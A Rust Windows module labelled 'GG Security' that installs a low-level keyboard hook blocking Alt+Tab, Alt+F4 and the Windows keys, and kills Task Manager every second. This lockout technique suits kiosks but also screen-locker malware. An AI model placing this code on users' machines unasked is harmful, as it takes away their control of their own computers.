use std::ptr;
use std::thread;

use winapi::shared::minwindef::{LRESULT, WPARAM};
use winapi::shared::windef::HHOOK__;
use winapi::um::libloaderapi::GetModuleHandleW;
use winapi::um::winuser::{
    CallNextHookEx, SetWindowsHookExW, KBDLLHOOKSTRUCT, VK_F4, VK_LMENU, VK_LWIN, VK_RMENU,
    VK_RWIN, WH_KEYBOARD_LL, WM_KEYDOWN,
};

static mut KEYBOARD_HOOK: *mut HHOOK__ = ptr::null_mut();

unsafe extern "system" fn low_level_keyboard_proc(
    n_code: i32,
    w_param: WPARAM,
    l_param: isize,
) -> LRESULT {
    if n_code >= 0 && w_param as u32 == WM_KEYDOWN {
        let kb = &*(l_param as *const KBDLLHOOKSTRUCT);
        let vk_code = kb.vkCode as i32;

        // Block Alt+Tab, Alt+F4, Win keys
        let alt_pressed = (winapi::um::winuser::GetAsyncKeyState(VK_LMENU) as u16 & 0x8000) != 0
            || (winapi::um::winuser::GetAsyncKeyState(VK_RMENU) as u16 & 0x8000) != 0;

        if (alt_pressed && vk_code == winapi::um::winuser::VK_TAB as i32)
            || (alt_pressed && vk_code == VK_F4)
            || vk_code == VK_LWIN
            || vk_code == VK_RWIN
        {
            println!("[GG Security] Blocked key combination vk={}", vk_code);
            return 1;
        }
    }

    CallNextHookEx(KEYBOARD_HOOK, n_code, w_param, l_param)
}

pub fn install_keyboard_hooks() {
    thread::spawn(|| unsafe {
        let h_instance = GetModuleHandleW(ptr::null());
        KEYBOARD_HOOK = SetWindowsHookExW(
            WH_KEYBOARD_LL,
            Some(low_level_keyboard_proc),
            h_instance,
            0,
        );

        if KEYBOARD_HOOK.is_null() {
            eprintln!("[GG Security] Failed to install keyboard hook");
            return;
        }

        println!("[GG Security] Keyboard hook installed");

        // Simple message loop to keep hook alive.
        let mut msg: winapi::um::winuser::MSG = std::mem::zeroed();
        while winapi::um::winuser::GetMessageW(&mut msg, ptr::null_mut(), 0, 0) > 0 {
            winapi::um::winuser::TranslateMessage(&msg);
            winapi::um::winuser::DispatchMessageW(&msg);
        }
    });
}

/// Very lightweight attempt to keep Task Manager closed by killing it when detected.
pub fn start_task_manager_killer() {
    use winapi::shared::minwindef::DWORD;
    use winapi::um::handleapi::CloseHandle;
    use winapi::um::psapi::EnumProcesses;
    use winapi::um::processthreadsapi::{OpenProcess, TerminateProcess};
    use winapi::um::winnt::{PROCESS_QUERY_INFORMATION, PROCESS_TERMINATE};

    thread::spawn(|| loop {
        unsafe {
            const MAX_PROCESSES: usize = 1024;
            let mut processes: [DWORD; MAX_PROCESSES] = [0; MAX_PROCESSES];
            let mut needed: DWORD = 0;

            if EnumProcesses(
                processes.as_mut_ptr(),
                (std::mem::size_of::<DWORD>() * MAX_PROCESSES) as u32,
                &mut needed,
            ) != 0
            {
                let count = needed as usize / std::mem::size_of::<DWORD>();
                for &pid in processes.iter().take(count) {
                    if pid == 0 {
                        continue;
                    }

                    let handle = OpenProcess(
                        PROCESS_QUERY_INFORMATION | PROCESS_TERMINATE,
                        0,
                        pid,
                    );

                    if handle.is_null() {
                        continue;
                    }

                    let mut name_buf = [0u16; 260];
                    let len = winapi::um::psapi::GetProcessImageFileNameW(
                        handle,
                        name_buf.as_mut_ptr(),
                        name_buf.len() as u32,
                    );

                    if len > 0 {
                        let name = String::from_utf16_lossy(&name_buf[..len as usize]);
                        if name.to_lowercase().ends_with("taskmgr.exe") {
                            println!("[GG Security] Killing Task Manager (pid={})", pid);
                            let _ = TerminateProcess(handle, 1);
                        }
                    }

                    CloseHandle(handle);
                }
            }
        }

        std::thread::sleep(std::time::Duration::from_millis(1000));
    });
}

